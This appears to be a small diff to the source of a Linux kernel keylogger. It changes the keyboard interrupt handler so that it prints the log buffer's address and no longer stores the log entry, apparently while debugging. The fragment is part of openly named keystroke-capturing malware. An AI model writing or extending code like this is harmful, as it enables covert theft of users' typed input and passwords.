@@ -153,7 +153,8 @@ static irqreturn_t keylogger_handle(int irq_n, void *data)
 	printk(KERN_INFO "%s ", log_line);
 	handle_scancode(key);
 	log_line[strlen(log_line)] = '\n'; //add a newline at end of our log entry
-	add_new_entry(log_line);
+	printk(KERN_INFO "%p\n", keylogger_data.log_buffer);
+//	add_new_entry(log_line);
 	return IRQ_HANDLED;
 }
 
